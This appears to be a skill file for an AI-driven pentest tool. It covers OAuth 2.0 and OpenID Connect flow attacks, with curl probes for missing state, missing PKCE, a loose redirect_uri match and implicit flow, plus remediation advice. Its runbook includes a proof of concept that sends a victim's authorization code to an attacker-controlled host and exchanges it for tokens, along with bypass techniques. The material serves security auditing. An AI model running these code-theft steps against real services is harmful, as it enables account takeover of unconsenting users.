---
name: oauth-oidc
description: OAuth 2.0 / OIDC flow attacks — state CSRF, PKCE bypass, redirect_uri loose-match, scope creep, token leakage
triggers: [oauth, oidc, openid connect, authorization code, redirect_uri, state parameter, pkce, code challenge, implicit flow]
---

# OAuth 2.0 / OpenID Connect Flow Attacks

OAuth is the de-facto delegation framework for modern SaaS; OIDC layers identity on top. Both rely on a tightly-orchestrated multi-party flow (user agent ↔ client ↔ authorization server ↔ resource server). Real-world exploitation focuses on the **flow's edge cases**: missing `state`, missing PKCE on public clients, loose `redirect_uri` matching, scope creep, implicit-flow leakage, and `id_token` validation gaps.

This skill is distinct from `authentication_jwt.md` (which covers JWT signing / alg-confusion). Companion to `scan_oauth`.

## Attack Surface

**Spec landscape**
- OAuth 2.0 (RFC 6749) + Security BCP (RFC 9700, 2024) — most current security guidance
- OAuth 2.1 (draft) — folds BCPs in, removes implicit flow
- OIDC Core — adds identity tokens (`id_token`)
- OAuth Device Authorization (RFC 8628) — IoT / TV flows; common in modern dev tools (`gh auth login`)

**Discovery endpoints**
- OIDC: `/.well-known/openid-configuration`
- OAuth: `/.well-known/oauth-authorization-server` (RFC 8414)
- Common path variants: `/.well-known/openid-configuration/issuer`, `/auth/.well-known/...`

**Components to audit**
- Authorization endpoint (`/oauth/authorize`)
- Token endpoint (`/oauth/token`)
- UserInfo endpoint (OIDC)
- JWKS endpoint (`/.well-known/jwks.json`)
- Logout / revoke endpoints
- Dynamic client registration (RFC 7591) — when exposed, often misconfigured

## The Canonical Bug Class List

| Bug | Spec violation | Impact |
|---|---|---|
| Missing `state` enforcement | RFC 6749 §10.12 | CSRF on the authorization callback → account takeover |
| Missing PKCE on public clients | RFC 7636 / RFC 9700 | Auth-code interception → token theft |
| Loose `redirect_uri` matching | RFC 6749 §3.1.2 | Auth-code theft via attacker-controlled redirect host |
| Implicit flow (response_type=token) still supported | RFC 6749 §4.2 / OAuth 2.1 | Token leakage via URL fragment / Referer / browser history |
| OIDC missing `nonce` enforcement | OIDC Core §15.5.2 | `id_token` replay |
| Scope creep (client requests scopes user didn't grant) | OAuth UX bug | Privilege escalation post-consent |
| `state` not bound to user session | RFC 6749 §10.12 | Session fixation |
| Token endpoint missing `client_authentication` for confidential clients | RFC 6749 §2.3 | Anyone can exchange auth codes |
| Refresh token rotation absent | RFC 9700 §2.2.2 | Long-lived stolen refresh tokens |
| Dynamic Client Registration allows wildcard `redirect_uris` | RFC 7591 misconfig | Universal redirect_uri loose-match |
| `id_token` validation skips `iss` / `aud` / `exp` | OIDC Core §3.1.3.7 | Cross-IdP token confusion |
| Code reuse — auth code accepted twice | RFC 6749 §10.5 | Replay if attacker captures the code in-flight |

## Detection Channels

### Step 1 — discovery audit

```bash
# Pull the metadata
curl -s 'https://<TARGET>/.well-known/openid-configuration' > /tmp/oidc.json
cat /tmp/oidc.json | jq '{
  authz: .authorization_endpoint,
  token: .token_endpoint,
  userinfo: .userinfo_endpoint,
  response_types: .response_types_supported,
  grant_types: .grant_types_supported,
  code_challenge_methods: .code_challenge_methods_supported,
  scopes: .scopes_supported,
  token_endpoint_auth: .token_endpoint_auth_methods_supported,
  client_auth: .client_authentication_methods
}'
```

Red flags:
- `response_types_supported` contains `token` / `id_token token` → implicit flow enabled (medium)
- `code_challenge_methods_supported` missing or empty → PKCE not enforced (high for public clients)
- `token_endpoint_auth_methods_supported` includes `none` → tokens issued without client auth

### Step 2 — `state` enforcement probe

```bash
# Authorization request WITHOUT state — should be rejected
curl -i 'https://<TARGET>/oauth/authorize?response_type=code&client_id=<CLIENT>&redirect_uri=<REDIR>&scope=openid'

# Compliant server returns 400 with "missing state" or similar
# Vulnerable server returns 302 redirect to consent / login — accepting the request
```

### Step 3 — PKCE enforcement probe

```bash
# Auth request WITHOUT code_challenge
curl -i "https://<TARGET>/oauth/authorize?response_type=code&client_id=<CLIENT>&redirect_uri=<REDIR>&scope=openid&state=strix-probe"

# RFC 7636 says PKCE MUST be required for public clients
# Vulnerable: server accepts and returns 302 to login
```

### Step 4 — redirect_uri loose-match

```bash
# Test variations on the registered redirect_uri
REGISTERED='https://app.example.com/cb'

# Try variants that exact-match would reject
for variant in \
    "https://app.example.com.attacker.com/cb" \
    "https://app.example.com/cb/../../" \
    "https://app.example.com/cb?attacker=1" \
    "https://app.example.com/cb%23@attacker.com" \
    "https://app.example.com:80/cb" \
    "https://app.example.com//cb" \
    "https://app.example.com/cb/" \
    "//attacker.com/cb"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$variant'))")
  RESP=$(curl -s -i "https://<TARGET>/oauth/authorize?response_type=code&client_id=<CLIENT>&redirect_uri=${encoded}&scope=openid&state=test")
  printf "%-60s → " "$variant"
  echo "$RESP" | head -1
done
```

Any 302 to a non-registered location = loose-match.

### Step 5 — implicit flow probe

```bash
# Request a token via the implicit flow
curl -i "https://<TARGET>/oauth/authorize?response_type=token&client_id=<CLIENT>&redirect_uri=<REDIR>&scope=openid&state=test"
```

If the server returns a 302 with `#access_token=...` in the fragment, implicit flow is supported. RFC 9700 + OAuth 2.1 deprecate this — flag as medium.

### Step 6 — `scan_oauth` for full sweep

```bash
strix scan_oauth --url 'https://<TARGET>/' --client-id '<CLIENT>' --redirect-uri '<REDIR>'
```

## Operational Runbook

### Step 1 — discovery + audit (Phase 1)

Per Step 1 above. Note response_types_supported, PKCE support, and ACS endpoints.

### Step 2 — fire the 4 active probes

```bash
strix scan_oauth --url 'https://<TARGET>/oauth/authorize' --client-id '<CLIENT>'
```

Emits findings for state / PKCE / redirect_uri / implicit-flow each independently.

### Step 3 — exploit redirect_uri loose-match

```bash
# When loose-match is confirmed, weaponise:
# 1. Attacker hosts a clone of the legit redirect path at https://app.example.com.attacker.com/cb
# 2. Victim clicks attacker's auth URL with the tampered redirect_uri
# 3. AS issues a code to the attacker's host
# 4. Attacker exchanges code for tokens at the token endpoint (client_secret-less for public clients)

# PoC sequence:
ATTACKER_REDIR='https://app.example.com.attacker.com/cb'
AUTH_URL="https://<TARGET>/oauth/authorize?response_type=code&client_id=<CLIENT>&redirect_uri=${ATTACKER_REDIR}&scope=openid+profile&state=$(uuidgen)"
echo "Victim auth URL: $AUTH_URL"
# Victim visits → consents → AS 302s to attacker.com.attacker.com/cb?code=<AUTHCODE>
# Attacker's server captures the code, exchanges:
curl -X POST 'https://<TARGET>/oauth/token' \
  -d "grant_type=authorization_code&code=<AUTHCODE>&redirect_uri=${ATTACKER_REDIR}&client_id=<CLIENT>"
# Tokens issued; account takeover complete.
```

### Step 4 — exploit missing PKCE

```bash
# Without PKCE, a leaked auth code (via Referer, malicious iframe, log dump) can be exchanged for tokens
# by anyone with the public client_id

# Steal a code via Referer leak: victim's browser sends Referer header on the redirect_uri response
# pointing to the next-clicked URL. If that's attacker-controlled, the code leaks.
# Attacker then:
curl -X POST 'https://<TARGET>/oauth/token' \
  -d 'grant_type=authorization_code&code=<STOLEN>&redirect_uri=<LEGIT_REDIR>&client_id=<CLIENT>'
```

### Step 5 — scope creep audit

```bash
# Compare claimed scopes vs accessible endpoints
# Get a token with scope=read
TOKEN_READ=$(curl -X POST '<TARGET>/oauth/token' \
  -d 'grant_type=...&scope=read' | jq -r .access_token)

# Try a write operation
curl -X POST '<TARGET>/api/users' -H "Authorization: Bearer $TOKEN_READ" -d '{"name":"strix"}'
# If 200/201 → scope creep; tokens accepted for actions beyond claimed scope
```

### Step 6 — `id_token` validation audit (OIDC)

```bash
# Get an id_token via legitimate flow
ID_TOKEN=$(curl ... | jq -r .id_token)

# Decode header + payload
echo "$ID_TOKEN" | cut -d. -f1 | base64 -d
echo "$ID_TOKEN" | cut -d. -f2 | base64 -d

# Common validation bugs in client code:
# - `iss` not checked → cross-IdP token swap
# - `aud` not checked → token issued for app A used at app B
# - `exp` not checked → tokens valid forever
# - `nonce` not bound to session → replay
# Test by tampering with each claim and presenting the token to client-side endpoints
```

## Bypass Techniques

- **Open redirect on registered URI**: if the legit redirect_uri also has an open-redirect bug, chain them — AS validates the URI strictly but the URI itself redirects to the attacker.
- **Mixed scope grants**: request `openid` + a custom scope; some AS issue both even when user only consented to one.
- **PKCE downgrade**: request with `code_challenge_method=plain` instead of `S256` — RFC says servers MUST reject plain for public clients but many don't.
- **Auth-code replay**: send the same authorization code to the token endpoint twice — compliant servers reject the second; many don't.
- **Refresh token reuse**: legitimate refresh, then use the *old* refresh token — compliant servers detect this and revoke; many don't (no rotation).

## Validation

1. State bypass: complete an authorization flow without a `state` parameter and receive a valid auth code.
2. PKCE bypass: complete a public-client auth flow without `code_challenge`; exchange the code for tokens without `code_verifier`.
3. redirect_uri loose-match: redirect a victim's auth code to an attacker-controlled host.
4. Implicit flow leakage: capture `#access_token=` in URL fragment from a 302 response.
5. Scope creep: show token issued with scope X being accepted for action requiring scope Y.

## False Positives

- **First-party SSO with strict client config**: AS may enforce server-side that public clients must use PKCE, even if metadata doesn't advertise it. Confirm by actually trying the flow without PKCE.
- **Pre-shared secret in `state` parameter**: some apps use `state` as both CSRF token AND session binding; the missing-state probe may fail because the app drops the request silently rather than 4xx-ing.
- **`Origin` / `Referer`-based CSRF protection** on the authorization endpoint substituting for `state` — non-standard but functional.

## Impact

- Account takeover via redirect_uri loose-match — the single highest-impact OAuth bug.
- Cross-app token confusion via missing `aud` validation.
- Long-lived tokens from missing refresh rotation.
- Token leakage via implicit flow's URL fragment.
- CSRF on the callback enabling forced-login-as-attacker (attacker controls the account victim's actions are bound to).

## Remediation

1. **Enforce `state` on every authorization request**: RFC 6749 §10.12 + §10.14. Reject when missing for public clients.
2. **Require PKCE on all public clients**: `code_challenge_method=S256`. Reject `plain` and missing.
3. **Strict exact-match on `redirect_uri`**: byte-equal comparison; reject anything that's not registered (including trailing slash differences).
4. **Disable implicit flow** (OAuth 2.1 / RFC 9700 §2.1.2). Migrate clients to authorization-code-with-PKCE.
5. **Validate ALL id_token claims** in the client: `iss`, `aud`, `exp`, `iat`, `nonce`. Use a vetted library.
6. **Rotate refresh tokens** on every use; detect reuse and revoke the chain (RFC 6819 §5.2.2.3 / RFC 9700 §4.13).
7. **Bind `state` to user session** server-side; verify on callback that the issued `state` matches the session's.
8. **Authenticate confidential clients at the token endpoint** with client_secret / mutual TLS / private_key_jwt.

## Pro Tips

1. The `redirect_uri` loose-match bug is the single most-common high-severity finding in real-world OAuth audits.
2. Check the **error responses** to authorize: many AS leak which validation triggered the failure (e.g., `invalid_redirect_uri` vs `invalid_client`) — useful for fingerprinting.
3. Discovery endpoint `response_types_supported` is the cheapest fingerprint for implicit-flow exposure — no auth needed.
4. RFC 9700 (Security Best Current Practice, 2024) is the most current normative reference; cite it in findings.
5. Confluence: some commercial AS (Auth0, Okta) ship with safer defaults; smaller / homegrown AS are where the bugs cluster.

## Summary

OAuth's safety lives in the edges: state, PKCE, redirect_uri strict-match, no implicit flow, full id_token validation, refresh rotation. The spec describes them; many implementations skip them. Audit each independently.
